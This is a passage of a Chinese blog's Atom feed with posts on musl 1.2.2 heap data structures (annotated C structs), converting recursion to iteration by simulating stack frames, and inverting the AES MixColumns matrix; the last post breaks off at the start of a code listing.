    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/</id>
    <published>2022-10-12T10:48:54.000Z</published>
    <updated>2022-10-12T10:50:14.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc-流程总览"><a href="#malloc-流程总览" class="headerlink" title="malloc 流程总览"></a>malloc 流程总览</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-2-malloc%E6%80%BB%E8%A7%88/malloc.svg" alt="malloc.svg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;malloc-流程总览&quot;&gt;&lt;a href=&quot;#malloc-流程总览&quot; class=&quot;headerlink&quot; title=&quot;malloc 流程总览&quot;&gt;&lt;/a&gt;malloc 流程总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.githu</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(1)</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/</id>
    <published>2022-10-12T10:44:01.000Z</published>
    <updated>2022-10-12T10:44:41.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-basic-data-structure"><a href="#1-basic-data-structure" class="headerlink" title="1. basic data structure"></a>1. basic data structure</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="type">uint8_t</span> flag;        <span class="comment">//</span></span><br><span class="line"><span class="type">uint8_t</span> idx:<span class="number">5</span>;       <span class="comment">//在当前group 中的索引</span></span><br><span class="line"><span class="type">uint8_t</span> reversed:<span class="number">3</span>;  <span class="comment">//</span></span><br><span class="line"><span class="type">uint16_t</span>offset;    <span class="comment">//UserData 距离 group-&gt; storage的偏移.</span></span><br><span class="line"><span class="type">char</span> UserData[];     <span class="comment">//保存用户数据.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//每个group 开头的数据,一共16 个字节.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;     <span class="comment">//active idx 有可能是小于last_idx的.</span></span><br><span class="line"><span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>]; <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后面这些用来放chunk</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line"><span class="comment">//同一个active 里面保存的metas通过双向循环链表连接起来.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, </span></span><br><span class="line"><span class="class">*<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span>  <span class="comment">//指向group.</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> avail_mask,<span class="comment">//bitmap ,标记哪个chunk 是有效的. </span></span><br><span class="line">freed_mask;      <span class="comment">//bitmap ,标记哪个chunk 被释放了. </span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;  <span class="comment">//记录最后一个chunk的idx</span></span><br><span class="line"><span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">//所属的size class (是个index..)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个meta_area中可以分配出多个meta.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> check;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> nslots;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line"><span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> init_done;    <span class="comment">//初始化 secret.</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> mmap_counter;<span class="comment">//记录mmap的个数</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">//保存free 的meta</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span> <span class="comment">//这个是保存当前area中剩余未使用的部分</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> avail_meta_count,  <span class="comment">//这个是用来保存当前area中剩余的meta的个数...</span></span><br><span class="line"></span><br><span class="line">avail_meta_area_count, meta_alloc_shift;</span><br><span class="line"><span class="comment">//这个链表用来保存使用的area</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line"><span class="comment">//这个是用来保存未使用的areas区域 (.bss段后面未使用的)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">//创建出来的group所包含的chunk总个数,</span></span><br><span class="line"><span class="comment">//包括被free的chunk和被alloc的chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line"><span class="type">uint8_t</span> seq;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> brk;                  <span class="comment">//bss 段结尾.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大体的内存布局:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-1/Untitled.svg" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-basic-data-structure&quot;&gt;&lt;a href=&quot;#1-basic-data-structure&quot; class=&quot;headerlink&quot; title=&quot;1. basic data structure&quot;&gt;&lt;/a&gt;1. basic data struc</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>任意递归写法转迭代写法</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%95/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%95/</id>
    <published>2022-10-12T06:10:58.000Z</published>
    <updated>2022-10-12T06:14:42.510Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h1><p>想到一种通用的解法，直接模拟x86下c语言程序栈结构去执行。</p><p>先看一下x86下c语言函数的栈结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------</span><br><span class="line"></span><br><span class="line">局部变量</span><br><span class="line"></span><br><span class="line">--------</span><br><span class="line">返回地址</span><br><span class="line">--------</span><br><span class="line">调用者传递的参数</span><br><span class="line">--------</span><br></pre></td></tr></table></figure><p>其中返回值一般保存在eax (如果能保存下来的话)，eip控制下一条指令的地址。我们这里简化一下，用下面的结构体，我将其命名为 Ctx (当前函数的上下文)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Ctx</span>&#123;</span></span><br><span class="line"><span class="type">int</span> args;           <span class="comment">//当前函数的参数</span></span><br><span class="line"><span class="type">int</span> vars;           <span class="comment">//当前函数的局部变量.</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> return_val;     <span class="comment">//保存当前函数调用其他函数时的返回值</span></span><br><span class="line"><span class="type">int</span> pc;             <span class="comment">//控制当前函数下一句执行的代码，相当于给每一个函数一个eip寄存器</span></span><br><span class="line"><span class="comment">//所以我们就不需要保存返回地址了.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Example1：二叉树的中序遍历"><a href="#Example1：二叉树的中序遍历" class="headerlink" title="Example1：二叉树的中序遍历"></a>Example1：二叉树的中序遍历</h1><h2 id="递归的写法"><a href="#递归的写法" class="headerlink" title="递归的写法:"></a>递归的写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel_by_recursive</span><span class="params">(TreeNode*node)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">travel_by_recursive(node-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d\n&quot;</span>, node-&gt;val);</span><br><span class="line">travel_by_recursive(node-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代的写法"><a href="#迭代的写法" class="headerlink" title="迭代的写法:"></a>迭代的写法:</h2><p>先定义一个ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctx</span>&#123;</span></span><br><span class="line">TreeNode*node;<span class="comment">//传递给当前函数的参数.</span></span><br><span class="line"><span class="type">int</span> vars;      <span class="comment">//局部变量,当前函数内的，这个例子没有用到</span></span><br><span class="line"><span class="type">int</span> return_val;<span class="comment">//临时变量,保存某个函数调用时的返回值.这个例子没有用到.</span></span><br><span class="line"><span class="type">int</span> pc;    <span class="comment">//控制下一行代码.</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后照着上面的递归写法转换:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">travel</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span>&lt;ctx&gt; s;</span><br><span class="line">s.push(&#123; root, <span class="number">0</span>, <span class="number">0</span>,<span class="number">0</span> &#125;);</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="comment">//执行当前函数内(ctx)的代码:</span></span><br><span class="line"><span class="keyword">auto</span> &amp; t = s.top();</span><br><span class="line"><span class="keyword">switch</span> (t.pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (t.node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t.pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//travel_by_recursive(node-&gt;left);</span></span><br><span class="line">s.push(&#123; t.node-&gt;left, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>&#125;);<span class="comment">//pc初始化为0.</span></span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//printf(&quot;val:%d\n&quot;, node-&gt;val);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d&quot;</span>, t.node-&gt;val);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//travel_by_recursive(node-&gt;right);</span></span><br><span class="line">s.push(&#123; t.node-&gt;right, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>&#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">s.pop();<span class="comment">//函数返回.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在迭代的写法中，我们直接用一个switch 来根据pc 执行不同的代码</p><h1 id="Example2-求二分查找数组中的最大值"><a href="#Example2-求二分查找数组中的最大值" class="headerlink" title="Example2: 求二分查找数组中的最大值"></a>Example2: 求二分查找数组中的最大值</h1><h2 id="递归的写法-1"><a href="#递归的写法-1" class="headerlink" title="递归的写法:"></a>递归的写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_recursive</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (left == right || (right - left) == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> max(arr[left], arr[right]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left_m = get_max_by_recursive(arr, left, (left + right) / <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> right_m = get_max_by_recursive(arr, (left + right) / <span class="number">2</span> + <span class="number">1</span>, right);</span><br><span class="line"><span class="keyword">return</span> max(left_m, right_m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非递归的写法"><a href="#非递归的写法" class="headerlink" title="非递归的写法:"></a>非递归的写法:</h2><p>定义一个ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSMaxCtx</span>&#123;</span></span><br><span class="line"><span class="comment">//args:</span></span><br><span class="line"><span class="type">int</span>*arr;</span><br><span class="line"><span class="type">int</span> left, right;</span><br><span class="line"><span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> left_m, right_m;</span><br><span class="line"><span class="comment">//临时变量,保存某个函数调用时的返回值.</span></span><br><span class="line"><span class="type">int</span> return_val;</span><br><span class="line"><span class="comment">//控制下一行代码.</span></span><br><span class="line"><span class="type">int</span> pc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>迭代写法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_iterate</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"><span class="type">int</span> max_val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二分查找最大值.</span></span><br><span class="line"><span class="built_in">stack</span>&lt;BSMaxCtx&gt;s;</span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; arr, left, right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; t = s.top();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (t.pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//判断终止条件</span></span><br><span class="line"><span class="keyword">if</span> (t.left == t.right || (t.left + <span class="number">1</span>) == t.right)&#123;</span><br><span class="line"><span class="type">int</span> tmp = max(t.arr[t.left], t.arr[t.right]);</span><br><span class="line">s.pop();</span><br><span class="line"><span class="comment">//将返回值传给上一次调用.</span></span><br><span class="line"><span class="keyword">if</span> (s.empty())&#123;</span><br><span class="line">max_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s.top().return_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t.pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, left, (left + right) / 2);</span></span><br><span class="line">s.push(&#123; t.arr, t.left, (t.left + t.right) / <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">//left_m = eax;</span></span><br><span class="line">t.left_m = t.return_val;</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, (left + right) / 2 + 1, right);</span></span><br><span class="line">s.push(&#123; t.arr, (t.left + t.right) / <span class="number">2</span> + <span class="number">1</span>, t.right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;);</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="comment">//right_m = eax;</span></span><br><span class="line">t.right_m = t.return_val;</span><br><span class="line">t.pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="comment">//return max(left_m, right_m);</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="type">int</span> tmp = max(t.left_m, t.right_m);</span><br><span class="line">s.pop();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s.empty())&#123;</span><br><span class="line">max_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">s.top().return_val = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> max_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理:&quot;&gt;&lt;/a&gt;原理:&lt;/h1&gt;&lt;p&gt;想到一种通用的解法，直接模拟x86下c语言程序栈结构去执行。&lt;/p&gt;
&lt;p&gt;先看一下x86下c语言函数的栈结构:&lt;/p&gt;
&lt;figure</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>AES列混合矩阵求逆</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/</id>
    <published>2022-10-09T15:32:31.000Z</published>
    <updated>2022-10-09T15:36:43.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AES列混合-矩阵求逆"><a href="#AES列混合-矩阵求逆" class="headerlink" title="AES列混合 矩阵求逆"></a>AES列混合 矩阵求逆</h1><p>还是没太明白具体原理，瞎JB搞了下但是算出来了</p><p>GF(2^8) 的多项式，不太明白这个，貌似是 每个系数是 域中的一个元素 (0或者1)</p><p>多项式加法的话对应的系数进行定义在这个域上的加法操作就行，多项式乘法的话，展开相乘就行，最后相加的时候也是按照定义在域上的乘法</p><p>多项式除发:</p><p>写成对应的二进制数，然后按照小学学过的除法规则就能求出余数，(这里面不涉及减法…)</p><p>mod <em>0b100011011：</em></p><p>多项式相乘之后再mod 这个数，目的是将结果限制在 0-255内</p><p>重新定义了加法和乘法，然后按照新的规则就能求出逆矩阵了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 